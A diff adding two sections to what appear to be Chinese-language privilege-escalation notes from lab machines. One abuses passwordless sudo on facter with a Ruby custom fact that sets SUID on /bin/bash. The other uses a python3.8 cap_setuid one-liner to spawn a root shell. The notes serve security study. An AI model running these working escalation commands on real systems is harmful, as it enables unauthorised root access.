@@ -3010,3 +3010,64 @@ User jackie may run the following commands on localhost:
 - 4：第二个额外描述符。
 - ......
 - 10：第八个额外描述符。
+
+### sudo facter
+
+枚举 `sudo -l` 发现可以无密码使用 `sudo` 权限运行 `facter`。
+
+```bash
+trivia@facts:~$ sudo -l
+Matching Defaults entries for trivia on facts:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User trivia may run the following commands on facts:
+    (ALL) NOPASSWD: /usr/bin/facter
+```
+
+在 `/tmp` 目录中写一个提权的 `rb` 文件。
+
+```bash
+trivia@facts:/tmp/Enil$ cat >Enil.rb<< 'EOF'
+> #!/usr/bin/env ruby
+> puts "custom_fact=Enil"
+> system("chmod +s /bin/bash")
+> EOF
+trivia@facts:/tmp/Enil$ cat Enil.rb 
+#!/usr/bin/env ruby
+puts "custom_fact=Enil"
+system("chmod +s /bin/bash")
+```
+
+使用 `sudo` 权限另起一个 `bash`。
+
+```bash
+trivia@facts:/tmp/Enil$ sudo /usr/bin/facter --custom-dir=/tmp/Enil x
+custom_fact=Enil
+
+trivia@facts:/tmp/Enil$ ls -liah /bin/bash
+523 -rwsr-sr-x 1 root root 1.7M Mar  5  2025 /bin/bash
+trivia@facts:/tmp/Enil$ /bin/bash -p
+bash-5.2# whoami
+root
+```
+
+### python3 设置 setuid
+
+枚举发现 python3.8 可以 setuid。
+
+```bash
+nathan@cap:~$ getcap -r / 2>/dev/null
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+```
+
+使用 python 实现提权。
+
+```bash
+nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+root@cap:~# whoami
+root
+```
